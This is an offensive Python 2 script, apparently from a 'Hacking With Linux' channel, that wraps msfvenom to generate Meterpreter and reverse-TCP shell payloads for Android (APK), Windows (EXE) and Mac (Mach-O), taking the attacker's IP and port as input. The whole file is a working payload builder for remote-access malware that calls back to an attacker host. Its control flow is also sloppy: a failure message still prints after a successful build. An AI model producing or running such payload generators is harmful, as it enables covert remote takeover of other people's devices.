#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import sys
import commands
import os

gray = "\033[0;37m";
white = "\033[1;37m"
red = "\033[1;31m";
green = "\033[1;32m";
os.system('clear')

intro = ('''

\t ______               __ ____   ______ __   ______
\t|__    |.--.--.-----.|  |_   | |      |  |_|__    |.----.
\t|__    ||_   _|  _  ||  |_|  |_|  --  |   _|__    ||   _|
\t|______||__.__|   __||__|______|______|____|______||__|
\t              |__|                By Hacking With Linux
\t             https://www.youtube.com/c/HACKINGWITHLINUX
''')

print(green + intro)

ip = raw_input (green + " [~] " + white + "Enter your IP $ " + gray)
port = raw_input (green + " [~] " + white + "Enter your Port $ ")
payload_name = raw_input (green + " [~] " + white + "Enter a name for your payload $ ")
print (green + " [01] " + white + "Android OS")
print (green + " [02] " + white + "Windows OS")
print (green + " [03] " + white + "Mac OS (Python Payloads)")


OS=input (green + "\n\t[~] " + white + "Choose an OS $ ")

try:
    if OS==01: # Android
        print (green + " [✔] " + white + "You choose Android OS")
        print (green + " [01] " + white + "Reverse TCP ")
        print (green + " [02] " + white + "HTTP")
        payload = input (green + "\n\t [~] " + white + "Choose a payload $ ")

        if payload==01:
            payload = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " R > /root/Desktop/" + payload_name + ".apk")
            commands.getoutput(payload)
            print(green + " [~] " + white + "Payload made and added to your Desktop.")
            os.system('exit')

        if payload==02:
            print ("Comming soon.")

        else:
            print ("Can't find any matching payloads!")
        os.system('exit')



    if OS==02: # Windows
        print (green + " [✔] " + white + "You choose Windows OS")
        print (green + " [01] " + white + "Reverse TCP ")
        print (green + " [02] " + white + "HTTP")
        payload = input (green + "\n\t [~] " + white + "Choose a payload $ ")

        if payload==01:
            payload = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe > /root/Desktop/" + payload_name + ".exe")
            commands.getoutput(payload)
            print(green + " [~] " + white + "Payload made and added to your Desktop.")
            os.system('exit')

        if payload==02:
            print ("Comming soon.")

        else:
            print ("Can't find any matching payloads!")
        os.system('exit')



    if OS==03: # Mac
        print (green + " [✔] " + white + "You choose Mac OS")
        print (green + " [01] " + white + "Reverse TCP ")
        print (green + " [02] " + white + "HTTP")
        payload = input (green + "\n\t [~] " + white + "Choose a payload $ ")

        if payload==01:
            payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f macho > /root/Desktop/" + payload_name + ".macho")
            commands.getoutput(payload)
            print(green + " [~] " + white + "Payload made and added to your Desktop.")
            os.system('exit')

        if payload==02:
            print ("Comming soon.")

        else:
            print ("Can't find any matching payloads!")
        os.system('exit')

except (KeyboardInterrupt, SystemExit):
    print white + "\n\t[~] Stopping...." + white
